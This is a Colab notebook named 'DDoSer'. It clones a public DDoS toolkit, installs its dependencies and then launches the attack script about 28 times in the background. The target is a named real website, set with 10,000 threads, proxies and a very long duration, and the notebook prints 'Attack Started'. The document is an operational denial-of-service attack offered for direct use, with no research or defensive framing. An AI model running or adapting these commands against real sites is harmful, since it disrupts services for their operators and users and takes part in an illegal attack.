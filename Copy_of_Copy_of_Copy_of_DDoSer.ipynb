{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "name": "Copy of Copy of Copy of DDoSer.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/SnickersmixNO/SnickersmixNO/blob/main/Copy_of_Copy_of_Copy_of_DDoSer.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "uQ6J5QFnQien",
        "outputId": "72c44787-4a8d-4c4b-87da-aa196db7a85f"
      },
      "source": [
        "#m4s9b8\n",
        "#B3MOLA\n",
        "#------------------------------------------------------------------#\n",
        "#Colab DDoS Method\n",
        "#------------------------------------------------------------------#\n",
        "#Clone DDoS Script\n",
        "! git clone https://github.com/MHProDev/MHDDoS.git\n",
        "#------------------------------------------------------------------#\n",
        "#Install Python Requirements\n",
        "! cd MHDDoS && pip3 install -r requirements.txt\n",
        "#------------------------------------------------------------------#"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Cloning into 'MHDDoS'...\n",
            "remote: Enumerating objects: 343, done.\u001b[K\n",
            "remote: Counting objects: 100% (150/150), done.\u001b[K\n",
            "remote: Compressing objects: 100% (77/77), done.\u001b[K\n",
            "remote: Total 343 (delta 85), reused 123 (delta 63), pack-reused 193\u001b[K\n",
            "Receiving objects: 100% (343/343), 501.19 KiB | 3.19 MiB/s, done.\n",
            "Resolving deltas: 100% (184/184), done.\n",
            "Requirement already satisfied: requests in /usr/local/lib/python3.7/dist-packages (from -r requirements.txt (line 1)) (2.23.0)\n",
            "Requirement already satisfied: pysocks in /usr/local/lib/python3.7/dist-packages (from -r requirements.txt (line 2)) (1.7.1)\n",
            "Collecting socks\n",
            "  Downloading socks-0.tar.gz (618 bytes)\n",
            "Collecting cfscrape\n",
            "  Downloading cfscrape-2.1.1-py3-none-any.whl (12 kB)\n",
            "Collecting icmplib\n",
            "  Downloading icmplib-3.0-py3-none-any.whl (30 kB)\n",
            "Collecting scapy\n",
            "  Downloading scapy-2.4.5.tar.gz (1.1 MB)\n",
            "\u001b[K     |████████████████████████████████| 1.1 MB 16.1 MB/s \n",
            "\u001b[?25hRequirement already satisfied: chardet<4,>=3.0.2 in /usr/local/lib/python3.7/dist-packages (from requests->-r requirements.txt (line 1)) (3.0.4)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.7/dist-packages (from requests->-r requirements.txt (line 1)) (2021.5.30)\n",
            "Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.7/dist-packages (from requests->-r requirements.txt (line 1)) (2.10)\n",
            "Requirement already satisfied: urllib3!=1.25.0,!=1.25.1,<1.26,>=1.21.1 in /usr/local/lib/python3.7/dist-packages (from requests->-r requirements.txt (line 1)) (1.24.3)\n",
            "Building wheels for collected packages: socks, scapy\n",
            "  Building wheel for socks (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for socks: filename=socks-0-py3-none-any.whl size=981 sha256=3d7245911e7b56e7b35353258be2c612119be26d9171b8d7072b82dadb1583a2\n",
            "  Stored in directory: /root/.cache/pip/wheels/8b/91/79/e0b757b1074af350cbb06e03ce1c60ab061d860ba7854a1ec2\n",
            "  Building wheel for scapy (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for scapy: filename=scapy-2.4.5-py2.py3-none-any.whl size=1261554 sha256=19e18f116dc9566e65a84da9e00a5ae68587a40d82938f993d2d7d66d954dba4\n",
            "  Stored in directory: /root/.cache/pip/wheels/b9/6e/c0/0157e466a5e02d3ff28fc7587dff329b4a967a23b3f9b11385\n",
            "Successfully built socks scapy\n",
            "Installing collected packages: socks, scapy, icmplib, cfscrape\n",
            "Successfully installed cfscrape-2.1.1 icmplib-3.0 scapy-2.4.5 socks-0\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vwD1dbYkW6yM"
      },
      "source": [
        "#------------------------------------------------------------------#\n",
        "#Import Requirements\n",
        "import string\n",
        "#------------------------------------------------------------------#\n",
        "#Target\n",
        "Method = \"get\"\n",
        "Input = \"https://digimovie.uno\"\n",
        "ProxyType = 1\n",
        "Threads = 10000\n",
        "MultiIP = 1000000\n",
        "Time = 858585\n",
        "#------------------------------------------------------------------#\n",
        "#Multi Run\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! cd MHDDoS && nohup python3 start.py \"$Method\" \"$Input\" \"$ProxyType\" \"$Threads\" proxy.txt \"$MultiIP\" \"$Time\" > /dev/null 2>&1&\n",
        "! clear\n",
        "! echo Attack Started\n",
        "#------------------------------------------------------------------#"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zDjgMoswXEiu"
      },
      "source": [
        "#------------------------------------------------------------------#\n",
        "#Stop All Attacks\n",
        "! killall python3\n",
        "#------------------------------------------------------------------#"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}